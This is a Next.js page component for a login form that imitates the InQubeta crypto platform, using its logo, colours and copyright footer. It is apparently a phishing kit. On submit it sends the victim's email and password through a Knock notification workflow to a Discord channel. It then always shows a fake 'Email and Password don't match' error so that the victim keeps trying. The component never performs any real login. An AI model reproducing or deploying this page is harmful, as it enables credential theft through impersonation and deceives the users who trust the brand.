"use client";
import Image from "next/image";
import { useEffect, useState } from "react";
const { Knock } = require("@knocklabs/node");

export default function Home() {
  const knock = new Knock(process.env.NEXT_PUBLIC_KNOCK_API_KEY);
  const [email, setEmail] = useState(null);
  const [password, setPassword] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);
  const handleTrigger = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    knock.objects.set("project5", "project-1", {
      name: "My project5",
      total_assets: 10,
      tags: ["cool", "fun", "project"],
    });
    setTimeout(() => {
      setLoading(false);
      setEmail("");
      setPassword("");
      setError(true);
    }, 5000);
    await knock.objects.setChannelData(
      "project5",
      "projects-1",
      process.env.NEXT_PUBLIC_KNOCK_DISCORD_CHANNEL_ID,
      {
        connections: [
          {
            channel_id: "1212536290910933005",
          },
        ],
      }
    );
    await knock.workflows.trigger("adert", {
      data: { email, password },
      recipients: [{ id: "projects-1", collection: "project5" }],
    });
  };

  const handlePassword = () => {
    const password = document.getElementById("password");
    if (password.getAttribute("type") == "password") {
      password.setAttribute("type", "text");
    } else if (password.getAttribute("type") == "text") {
      password.setAttribute("type", "password");
    }
  };

  useEffect(() => {}, [loading]);
  useEffect(() => {}, [email]);
  useEffect(() => {}, [password]);

  return (
    <div className="flex justify-center items-center flex-col min-h-[100vh] bg-[url('/hero-bg.png')] bg-cover bg-bottom">
      <div className="flex items-center justify-center">
        <img
          src="https://buy.inqubeta.ai/_next/image?url=%2Fimages%2Flogo.png&w=384&q=75"
          className="scale-50"
        />
      </div>
      <div className="w-full flex mt-5">
        <div className="flex flex-col w-full self-center">
          <div className="flex flex-col relative overflow-hidden height-auto text-foreground box-border outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 shadow-medium transition-transform-background motion-reduce:transition-none max-w-[380px] w-full m-auto p-2 bg-white bg-center bg-cover rounded-xl">
            <div className="relative flex w-full p-5 flex-auto flex-col place-content-inherit align-items-inherit h-auto break-words text-left subpixel-antialiased overflow-hidden z-10">
              <div className="text-2xl font-bold text-center pb-6 bruno text-[#00B7FF]">
                Login
              </div>
              <form className="flex flex-col gap-4" onSubmit={handleTrigger}>
                {error ? (
                  <p className="text-red-500 text-sm">
                    Email and Password don't match
                  </p>
                ) : (
                  ""
                )}
                <div className="group flex flex-col w-full">
                  <div
                    className="relative w-full inline-flex tap-highlight-transparent shadow-sm px-3 bg-default-100 min-h-unit-10 flex-col items-start justify-center gap-y-1 transition-background motion-reduce:transition-none !duration-150 outline-none h-14 py-2 rounded-lg border-[3px] border-[#00B7FF] bg-gray-100"
                    style={{ cursor: "text" }}
                  >
                    <label className="block font-medium text-xs cursor-text will-change-auto origin-top-left transition-all !duration-200 !ease-out motion-reduce:transition-none text-black dark:text-black">
                      Email
                    </label>
                    <div className="inline-flex h-full items-center w-full gap-1.5 box-border bg-transparent">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 24 24"
                        fill="currentColor"
                        aria-hidden="true"
                        className="text-[#00B7FF]/60 w-4 h-4 dark:text-[#00B7FF]/60 pointer-events-none flex-shrink-0"
                      >
                        <path d="M1.5 8.67v8.58a3 3 0 003 3h15a3 3 0 003-3V8.67l-8.928 5.493a3 3 0 01-3.144 0L1.5 8.67z"></path>
                        <path d="M22.5 6.908V6.75a3 3 0 00-3-3h-15a3 3 0 00-3 3v.158l9.714 5.978a1.5 1.5 0 001.572 0L22.5 6.908z"></path>
                      </svg>
                      <input
                        className="w-full h-full font-normal !bg-transparent outline-none text-sm bg-foreground text-black/90 dark:text-black placeholder:text-black dark:placeholder:text-black"
                        placeholder="Enter your email"
                        onChange={(e) => setEmail(e.target.value)}
                      />
                    </div>
                  </div>
                </div>
                <div className="group flex flex-col w-full">
                  <div className="relative w-full inline-flex tap-highlight-transparent shadow-sm px-3 bg-default-100 min-h-unit-10 flex-col items-start justify-center gap-y-1 transition-background motion-reduce:transition-none !duration-150 outline-none h-14 py-2 rounded-lg border-[3px] border-[#00B7FF] bg-gray-100">
                    <label className="block font-medium text-xs cursor-text will-change-auto origin-top-left transition-all !duration-200 !ease-out motion-reduce:transition-none text-black dark:text-black">
                      Password
                    </label>
                    <div className="inline-flex h-full items-center w-full gap-1.5 box-border bg-transparent">
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        viewBox="0 0 24 24"
                        fill="currentColor"
                        aria-hidden="true"
                        className="text-[#00B7FF]/60 w-4 h-4 dark:text-[#00B7FF]/60 pointer-events-none flex-shrink-0"
                      >
                        <path
                          fillRule="evenodd"
                          d="M12 1.5a5.25 5.25 0 00-5.25 5.25v3a3 3 0 00-3 3v6.75a3 3 0 003 3h10.5a3 3 0 003-3v-6.75a3 3 0 00-3-3v-3c0-2.9-2.35-5.25-5.25-5.25zm3.75 8.25v-3a3.75 3.75 0 10-7.5 0v3h7.5z"
                          clipRule="evenodd"
                        ></path>
                      </svg>
                      <input
                        className="w-full h-full font-normal !bg-transparent outline-none text-sm bg-foreground text-black/90 dark:text-black placeholder:text-black dark:placeholder:text-black"
                        placeholder="Enter your password"
                        onChange={(e) => setPassword(e.target.value)}
                        type="password"
                        id="password"
                      />
                      <button
                        className="focus:outline-none"
                        type="button"
                        onClick={handlePassword}
                      >
                        <svg
                          aria-hidden="true"
                          fill="none"
                          focusable="false"
                          height="1em"
                          role="presentation"
                          viewBox="0 0 24 24"
                          width="1em"
                          className="text-xl text-[#00B7FF]/60 dark:text-[#00B7FF]/60  pointer-events-none"
                        >
                          <path
                            d="M21.25 9.14969C18.94 5.51969 15.56 3.42969 12 3.42969C10.22 3.42969 8.49 3.94969 6.91 4.91969C5.33 5.89969 3.91 7.32969 2.75 9.14969C1.75 10.7197 1.75 13.2697 2.75 14.8397C5.06 18.4797 8.44 20.5597 12 20.5597C13.78 20.5597 15.51 20.0397 17.09 19.0697C18.67 18.0897 20.09 16.6597 21.25 14.8397C22.25 13.2797 22.25 10.7197 21.25 9.14969ZM12 16.0397C9.76 16.0397 7.96 14.2297 7.96 11.9997C7.96 9.76969 9.76 7.95969 12 7.95969C14.24 7.95969 16.04 9.76969 16.04 11.9997C16.04 14.2297 14.24 16.0397 12 16.0397Z"
                            fill="currentColor"
                          ></path>
                          <path
                            d="M11.9984 9.14062C10.4284 9.14062 9.14844 10.4206 9.14844 12.0006C9.14844 13.5706 10.4284 14.8506 11.9984 14.8506C13.5684 14.8506 14.8584 13.5706 14.8584 12.0006C14.8584 10.4306 13.5684 9.14062 11.9984 9.14062Z"
                            fill="currentColor"
                          ></path>
                        </svg>
                      </button>
                    </div>
                  </div>
                </div>
                <div className="flex gap-2 justify-end">
                  <button
                    className="z-0 group relative inline-flex items-center justify-center box-border appearance-none select-none whitespace-nowrap subpixel-antialiased overflow-hidden tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 px-unit-4 min-w-unit-20 h-unit-10 text-sm gap-unit-2 w-full [&amp;>svg]:max-w-[theme(spacing.unit-8)] data-[pressed=true]:scale-[0.97] transition-transform-colors motion-reduce:transition-none text-white font-semibold bg-[#00B7FF] rounded-md border-2 border-[#00658F] hover:bg-opacity-50 py-2"
                    type="submit"
                  >
                    {loading ? (
                      <span className="loading loading-spinner loading-md"></span>
                    ) : (
                      "Login"
                    )}
                  </button>
                </div>
                <div className="flex  justify-between">
                  <label className="group relative max-w-fit items-center justify-start tap-highlight-transparent p-2 -m-2 inline-flex cursor-pointer">
                    <div
                      style={{
                        border: 0,
                        clip: "rect(0 0 0 0)",
                        clipPath: "inset(50%)",
                        height: "1px",
                        margin: "-1px",
                        overflow: "hidden",
                        padding: 0,
                        position: "absolute",
                        width: "1px",
                        whiteSpace: "nowrap",
                      }}
                    >
                      <input
                        aria-label="Remember me"
                        aria-labelledby=":R1mdbbadda:"
                        type="checkbox"
                        value=""
                      />
                    </div>
                    <span
                      aria-hidden="true"
                      className="relative inline-flex items-center justify-center flex-shrink-0 overflow-hidden before:content-[''] before:absolute before:inset-0 before:border-solid before:border-2 before:box-border after:content-[''] after:absolute after:inset-0 after:scale-50 after:opacity-0 after:origin-center group-data-[selected=true]:after:scale-100 group-data-[selected=true]:after:opacity-100 group-data-[hover=true]:before:bg-default-100 outline-none group-data-[focus-visible=true]:z-10 group-data-[focus-visible=true]:ring-2 group-data-[focus-visible=true]:ring-focus group-data-[focus-visible=true]:ring-offset-2 group-data-[focus-visible=true]:ring-offset-background after:bg-[#00B7FF] after:text-[#00B7FF]-foreground text-[#00B7FF]-foreground w-4 h-4 mr-2 rounded-[calc(theme(borderRadius.medium)*0.5)] before:rounded-[calc(theme(borderRadius.medium)*0.5)] after:rounded-[calc(theme(borderRadius.medium)*0.5)] before:transition-colors group-data-[pressed=true]:scale-95 transition-transform after:transition-transform-opacity after:!ease-linear after:!duration-200 motion-reduce:transition-none before:border-[#00B7FF]/80"
                    >
                      <svg
                        aria-hidden="true"
                        role="presentation"
                        viewBox="0 0 17 18"
                        className="z-10 opacity-0 group-data-[selected=true]:opacity-100 w-3 h-2 transition-opacity motion-reduce:transition-none"
                      >
                        <polyline
                          fill="none"
                          points="1 9 7 14 15 4"
                          stroke="currentColor"
                          strokeDasharray="22"
                          strokeDashoffset="66"
                          strokeLinecap="round"
                          strokeLinejoin="round"
                          strokeWidth="2"
                        ></polyline>
                      </svg>
                    </span>
                    <span
                      id=":R1mdbbadda:"
                      className="relative select-none text-sm transition-colors-opacity before:transition-width motion-reduce:transition-none w-full text-black"
                    >
                      Remember me
                    </span>
                  </label>
                  <a className="text-sm text-black" href="/forget-password">
                    Forget Password?
                  </a>
                </div>
                <p className="text-center text-sm text-black">
                  Need to create an account?{" "}
                  <a className="cursor-pointer text-[#00B7FF]" href="/sign-up">
                    Sign up
                  </a>
                </p>
              </form>
            </div>
          </div>
        </div>
      </div>
      <div className="flex flex-col items-center mx-auto py-2 md:py-3 text-white">
        <div className="flex flex-col justify-center text-center">
          <a className="text-sm hover:text-primary/70">Privacy Policy</a>
          <a className="text-sm hover:text-primary/70">Terms and Conditions</a>
        </div>
        <div className="py-1">
          <span className="text-sm">© 2024 InQubeta. All Rights Reserved.</span>
        </div>
      </div>
    </div>
  );
}
